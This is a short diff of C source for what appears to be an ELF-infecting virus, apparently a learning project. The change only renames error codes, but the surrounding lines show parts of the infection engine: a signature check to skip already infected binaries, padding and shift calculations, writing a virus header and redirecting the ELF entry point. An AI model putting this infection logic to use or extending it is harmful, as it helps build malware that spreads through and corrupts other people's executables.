@@ -15,10 +15,10 @@ static bool	not_infected(const struct entry *file_entry, struct safe_ptr file_re
 	const size_t	signature_offset = entry_offset + dist_entry_header + sizeof(struct virus_header);
 	char	 	*signature       = safe(file_ref, signature_offset, SIGNATURE_LEN);
 
-	if (!signature) return errors(ERR_VIRUS, _ERR_ALREADY_INFECTED);
+	if (!signature) return errors(ERR_VIRUS, _ERR_V_CANT_READ_SIGNATURE);
 
 	if (checksum(signature, SIGNATURE_LEN) == SIGNATURE_CKSUM)
-		return errors(ERR_VIRUS, _ERR_ALREADY_INFECTED);
+		return errors(ERR_VIRUS, _ERR_V_ALREADY_INFECTED);
 
 	return true;
 }
@@ -27,7 +27,7 @@ static bool	change_entry(struct safe_ptr clone_ref, const struct entry *file_ent
 {
 	Elf64_Ehdr	*hdr = safe(clone_ref, 0, sizeof(Elf64_Ehdr));
 
-	if (!hdr)  return errors(ERR_FILE, _ERR_CANT_READ_ELFHDR);
+	if (!hdr)  return errors(ERR_FILE, _ERR_F_CANT_READ_ELFHDR);
 
 	const Elf64_Xword	sh_offset         = file_entry->safe_shdr->sh_offset;
 	const size_t		offset_in_section = file_entry->offset_in_section;
@@ -76,7 +76,7 @@ static bool	define_shift_amount(const struct entry *file_entry,
 	const size_t	end_padding = (p_memsz % p_align) + *shift_amount;
 
 	if (end_padding > p_align)
-		return errors(ERR_VIRUS, _ERR_NOT_ENOUGH_PADDING);
+		return errors(ERR_VIRUS, _ERR_V_NOT_ENOUGH_PADDING);
 
 	return true;
 }
@@ -103,7 +103,7 @@ bool		infection_engine(struct virus_header *vhdr, \
 	|| !adjust_sizes(&clone_entry, *shift_amount, *full_virus_size)
 	|| !setup_virus_header(clone_ref, *loader_off, *vhdr)
 	|| !change_entry(clone_ref, &file_entry))
-		return errors(ERR_THROW, _ERR_INFECTION_ENGINE);
+		return errors(ERR_THROW, _ERR_T_INFECTION_ENGINE);
 
 	return true;
 }
